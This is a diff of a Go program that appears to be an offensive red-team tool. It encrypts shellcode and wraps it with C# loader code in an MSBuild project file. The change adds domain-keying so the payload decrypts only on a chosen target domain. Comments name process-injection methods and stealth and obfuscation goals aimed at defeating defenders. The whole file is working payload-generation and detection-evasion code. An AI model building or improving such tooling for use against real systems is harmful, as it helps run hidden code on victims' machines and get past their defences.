@@ -15,17 +15,20 @@ import (
 	"time"
 )
 
-var version = "1.5"
+var version = "1.6"
+
+// basic2.cs = VirtualAlloc + CreateThread
+// notsobasic.cs = NtCreateSection + NtMapViewOfSection + delegate
+// complex.cs = NtCreateSection + NtMapViewOfSection + APC on a suspended threat at ntdll!RtlExitUserThread
 
 //TODO obfiscation - https://github.com/Flangvik/RosFuscator
-//TODO domain key
-//TODO use NtMapViewOfSection instead of VirtualAlloc
-//TODO make my MSBuild use Dinvoke to be more stealthy
+//TODO use Dinvoke to be more stealthy - https://rastamouse.me/blog/process-injection-dinvoke/
 
 type MSBuildPayload struct {
-	Payload string
-	Hash    string
-	Key     string
+	Payload   string
+	Hash      string
+	Key       string
+	DomainKey bool
 }
 
 func check(e error) {
@@ -97,9 +100,9 @@ func main() {
 	flag.StringVar(&codeFilename, "code", "payload.cs", "C# source code filename that the MSBuild payload should execute.")
 	flag.StringVar(&outFilename, "outfile", "", "Output filename for the MSBuild project or encrypted shellcode.")
 	flag.IntVar(&iterations, "rounds", 57285, "The number of iterations the loader will need to perform to reach the correct decryption key.")
-	flag.StringVar(&domainKey, "key", "", "Key to Domain: the payload will only execute on a specific domain.")
+	flag.StringVar(&domainKey, "key", "", "Key to Domain: the payload will only execute on a specific domain. Must be the FQDN.")
 	flag.BoolVar(&encryptOnly, "encryptOnly", false, "Output only the encrypted shellcode for another tool/project.")
-	flag.BoolVar(&obfuscate, "obfuscate", false, "Obfuscate the c# code using RosFuscator.")
+	flag.BoolVar(&obfuscate, "obfuscate", false, "[NOT IMPLEMENTED] Obfuscate the c# code using RosFuscator.")
 	flag.Parse()
 
 	if !fileExists(scFilename) {
@@ -184,28 +187,31 @@ func main() {
 		check(err)
 		fmt.Println("Done")
 
+		//fmt.Printf("[+] Stripping newline characters to make Blue Team's life harder ... ")
+		//MSBuildTemplate = strings.Replace(MSBuildTemplate, "\r\n", "", -1)
+
+		if len(domainKey) > 0 {
+			fmt.Printf("[+] Keying to domain %s...", domainKey)
+			key = xor(key, []byte(strings.ToUpper(domainKey)))
+			fmt.Println("Done")
+		}
+
+		fmt.Printf("[+] Creating msbuild profile file... ")
+		// insert code into MSBuild template
+		MSBuildTemplate = strings.Replace(MSBuildTemplate, "CODE_GOES_HERE", string(payloadCode), 1)
+		answers := MSBuildPayload{
+			Payload:   base64.StdEncoding.EncodeToString(encShellcode),
+			Hash:      formatBytes(shellcodeHash[:]),
+			Key:       formatBytes(key),
+			DomainKey: len(domainKey) > 0,
+		}
+		tmpl, err := template.New("msbuild_shellcode").Parse(MSBuildTemplate)
+		check(err)
+
 		if outFilename == "" {
 			t := time.Now()
 			outFilename = "payload" + t.Format("20060102150405") + ".xml"
 		}
-		// msbuild project template
-
-		// insert code into MSBuild template
-		MSBuildTemplate = strings.Replace(MSBuildTemplate, "CODE_GOES_HERE", string(payloadCode), 1)
-
-		//fmt.Printf("[+] Stripping newline characters to make Blue Team's life harder ... ")
-		//MSBuildTemplate = strings.Replace(MSBuildTemplate, "\r\n", "", -1)
-
-		fmt.Println("Done")
-
-		fmt.Printf("[+] Creating msbuild profile file... ")
-		answers := MSBuildPayload{
-			Payload: base64.StdEncoding.EncodeToString(encShellcode),
-			Hash:    formatBytes(shellcodeHash[:]),
-			Key:     formatBytes(key),
-		}
-		tmpl, err := template.New("msbuild_shellcode").Parse(MSBuildTemplate)
-		check(err)
 		outfile, err := os.Create(outFilename)
 		check(err)
 		err = tmpl.Execute(outfile, answers)
